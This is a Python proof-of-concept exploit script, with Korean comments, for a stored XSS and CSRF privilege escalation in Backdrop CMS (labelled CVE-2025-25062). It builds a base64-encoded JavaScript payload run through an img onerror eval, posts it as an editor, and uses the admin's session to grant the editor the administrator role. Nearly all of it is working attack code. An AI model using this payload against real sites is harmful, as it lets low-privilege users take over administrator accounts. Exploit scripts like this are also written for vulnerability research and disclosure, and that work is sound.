#!/usr/bin/env python3
"""
Exploit & Validation Combined Script (Minimal)
Exploit Title: Privilege Escalation via Stored XSS + CSRF in Backdrop CMS
Date: 2024-12-14
Author: Reid Hurlburt (rhburt)
Software Link: https://github.com/backdrop/backdrop/releases/tag/1.29.2
Tested on: Python 3.11.9
CVE: CVE-2025-25062

This script:
  1) Logs in as Editor and creates a malicious post (exploit).
  2) Logs in as Admin, visits the malicious post (triggering the XSS+CSRF).
  3) Verifies that the Editor's role has escalated to Administrator.
"""

import argparse
import requests
import re
import base64
import uuid
from urllib.parse import quote_plus

########################
# Exploit Functions
########################

def construct_payload(editor_user_id, editor_username, editor_email):
    """
    에디터 계정을 관리자 권한으로 상승시키는 XSS + CSRF Payload를 생성합니다.
    """
    url_encoded_editor_email = quote_plus(editor_email)

    # 자바스크립트 코드
    malicious_js = f"""
        var req = new XMLHttpRequest();
        req.onload = handleResponse;
        req.open('get', '/?q=user/{editor_user_id}/edit&destination=admin/people/list', true);
        req.withCredentials = true;
        req.send();
        
        function handleResponse() {{
            var build_id = this.responseText.match(/name="form_build_id" value="(form-[^"]*)"/)[1];
            var token = this.responseText.match(/name="form_token" value="([^"]*)"/)[1];
            var changeReq = new XMLHttpRequest();
            changeReq.open('post', '/?q=user/{editor_user_id}/edit', true);
            changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded')
            changeReq.withCredentials = true;
            changeReq.send('name={editor_username}&mail={url_encoded_editor_email}&pass=&form_build_id=' + build_id + '&form_token=' + token + '&form_id=user_profile_form&status=1&roles%5Beditor%5D=editor&roles%5Badministrator%5D=administrator&timezone=America%2FNew_York&additional_settings__active_tab=&op=Save');
        }};
    """
    # JS 코드 Base64 인코딩 후, <img> onerror에서 eval
    b64_encoded = base64.b64encode(malicious_js.encode('ascii')).decode('ascii')
    injection = f"<img src=x onerror='eval(atob(\"{b64_encoded}\"))'>"

    return injection

def create_exploit_post(session, backdrop_url, editor_user_id, editor_username, editor_email):
    """
    Backdrop 'Post' 콘텐츠로 악성 게시물을 생성합니다.
    """
    # 1. 게시글 생성 페이지 열기
    print("[*] Requesting post creation page...")
    response = session.get(f"{backdrop_url}/?q=node/add/post")
    if response.status_code != 200:
        print(f"[!] Error: Received status code {response.status_code} while fetching post creation page.")
        return None

    # 2. form_build_id, form_token 추출
    build_id_match = re.search(r'name="form_build_id" value="([^"]*)"', response.text)
    token_match = re.search(r'name="form_token" value="([^"]*)"', response.text)
    if not build_id_match or not token_match:
        print("[!] Error: form_build_id or form_token not found in response!")
        return None

    form_build_id = build_id_match.group(1)
    form_token = token_match.group(1)
    print(f"[*] Found form_build_id: {form_build_id}")
    print(f"[*] Found form_token: {form_token}")

    # 3. 실제 악성 게시글 생성 (POST)
    malicious_body = construct_payload(editor_user_id, editor_username, editor_email)
    post_title = "Malicious Exploit Post" + str(uuid.uuid4())  # 고정된 제목

    response = session.post(
        f"{backdrop_url}/?q=node/add/post",
        files={
            "title": (None, post_title),
            "body[und][0][value]": (None, malicious_body),
            "form_build_id": (None, form_build_id),
            "form_token": (None, form_token),
            "form_id": (None, "post_node_form"),
            "status": (None, "1"),
            "op": (None, "Save"),
        },
        allow_redirects=True,
    )
    if response.status_code != 200:
        print(f"[!] Error: Failed to create post. Received status code {response.status_code}.")
        return None

    print("[*] Successfully created malicious post.")
    return response.url

########################
# Validation Functions
########################

def visit_exploit_page(session, backdrop_url, exploit_url):
    print(f"[*] Visiting exploit page: {exploit_url}")
    response = session.get(exploit_url)
    
    # 응답 본문에서 <a href="/?q=node/7/edit">Edit</a> 형태의 링크를 찾아 파싱
    match = re.search(r'<a\s+href="([^"]+)"[^>]*>Edit</a>', response.text)
    if match:
        edit_link = match.group(1)
        
        # edit_link가 절대 경로(/?q=node/7/edit)라면 base URL과 합쳐서 풀 URL로 만든다
        if edit_link.startswith('/'):
            full_edit_url = backdrop_url.rstrip('/') + edit_link
        else:
            full_edit_url = edit_link
        
        print(f"[*] Found Edit link: {edit_link}")
        print(f"[*] Visiting Edit link: {full_edit_url}")
        response_edit = session.get(full_edit_url)
        # Why NOT!??!?!?!??!?!??
        return response_edit.text  # 최종 결과(편집 페이지) HTML을 반환
    
    else:
        print("[!] Could not find an Edit link in the exploit page response.")
        return response.text  # Edit 링크가 없으면 원본 응답을 반환

def check_editor_admin_status(session, backdrop_url, editor_user_id):
    user_edit_url = f"{backdrop_url}/?q=/user/{editor_user_id}/edit"
    print(f"[*] Checking if Editor ({editor_user_id}) has admin privileges...")
    response = session.get(user_edit_url)
    pattern = r'<input\s+type="checkbox"\s+id="edit-roles-administrator"\s+name="roles\[administrator\]"\s+value="administrator"\s+checked="checked"\s+class="form-checkbox"\s*/?>'
    match = re.search(pattern, response.text)

    if match:
        print("[*] Editor now has Administrator privileges! ✅")
    else:
        print("[!] Privilege escalation failed. ❌")


########################
# Common (Login / Info) Functions
########################

def login_user(session, backdrop_url, username, password):
    """
    주어진 username, password로 Backdrop 로그인하여 세션을 획득합니다.
    """
    print(f"[*] Logging in as '{username}'...")
    response = session.get(f"{backdrop_url}/?q=user/login")
    if response.status_code != 200:
        print("[!] Error: Couldn't open the login page.")
        return False

    # form_build_id 추출
    form_build_id_match = re.search(r'name="form_build_id" value="([^"]*)"', response.text)
    if not form_build_id_match:
        print("[!] Error: Could not find form_build_id on login page.")
        return False
    form_build_id = form_build_id_match.group(1)

    login_data = {
        "name": username,
        "pass": password,
        "form_build_id": form_build_id,
        "form_id": "user_login",
        "op": "Log in"
    }
    response = session.post(f"{backdrop_url}/?q=user/login", data=login_data)

    if ("Log out" in response.text) or ("Log out" in response.url):
        print("[*] Login successful!")
        return True
    else:
        print("[!] Login failed. Check credentials.")
        return False

def get_editor_info(session, backdrop_url, editor_username):
    """
    에디터의 User ID와 Email을 추출합니다.
    """
    # 에디터 프로필 페이지 (예: /?q=accounts/editor)
    response = session.get(f"{backdrop_url}/?q=accounts/{editor_username}")
    match = re.search(r'<a href="/\?q=user/(\d+)/edit">Edit</a>', response.text)
    if not match:
        print("[!] Failed to find Editor's user ID. Check if 'editor_username' is correct.")
        return None, None
    editor_user_id = int(match.group(1))

    # 에디터 편집 페이지에서 이메일 추출
    response = session.get(f"{backdrop_url}/?q=user/{editor_user_id}/edit")
    email_match = re.search(r'name="mail" value="([^"]*)"', response.text)
    if not email_match:
        print("[!] Failed to extract Editor's email from user edit page.")
        return editor_user_id, None

    editor_email = email_match.group(1)
    return editor_user_id, editor_email

########################
# Main
########################

def main():
    parser = argparse.ArgumentParser(description="Backdrop CMS Exploit + Validation Script (Minimal)")
    parser.add_argument("-u", "--backdrop-url", required=True, help="Backdrop CMS URL (e.g., http://localhost)")
    parser.add_argument("--editor-username", required=True, help="Editor username (to escalate)")
    parser.add_argument("--editor-password", required=True, help="Editor password")
    parser.add_argument("--admin-username", required=True, help="Admin username")
    parser.add_argument("--admin-password", required=True, help="Admin password")
    args = parser.parse_args()

    # URL 정리
    backdrop_url = args.backdrop_url.rstrip('/')

    # --------------------------
    # 1) Editor 단계
    # --------------------------
    editor_session = requests.Session()
    # (1-1) 에디터 로그인
    if not login_user(editor_session, backdrop_url, args.editor_username, args.editor_password):
        return
    
    # (1-2) 에디터 user_id, email 확인
    editor_user_id, editor_email = get_editor_info(editor_session, backdrop_url, args.editor_username)
    if editor_user_id is None or editor_email is None:
        return
    
    # (1-3) 악성 게시글 생성
    exploit_url = create_exploit_post(
        editor_session,
        backdrop_url,
        editor_user_id,
        args.editor_username,
        editor_email
    )
    if not exploit_url:
        print("[!] Failed to create exploit post. Aborting.")
        return
    print(f"[*] Exploit Post URL: {exploit_url}")
    print("[*] Please have an Admin visit the above URL to trigger the exploit...")

    # --------------------------
    # 2) Admin 단계
    # --------------------------
    admin_session = requests.Session()
    # (2-1) 관리자 로그인
    if not login_user(admin_session, backdrop_url, args.admin_username, args.admin_password):
        return
    
    # (2-2) 관리자 세션으로 exploit 페이지 방문 (XSS+CSRF 발동) -> headless로 실행 해야 함. 
    print(f"[*] Visiting exploit post as Admin: {exploit_url}")
    admin_session.get(exploit_url)

    # (2-3) 에디터의 관리 권한 확인
    # check_editor_admin_status(admin_session, backdrop_url, editor_user_id)
    print(visit_exploit_page(admin_session, backdrop_url, exploit_url))
    check_editor_admin_status(admin_session, backdrop_url, editor_user_id)

if __name__ == "__main__":
    main()
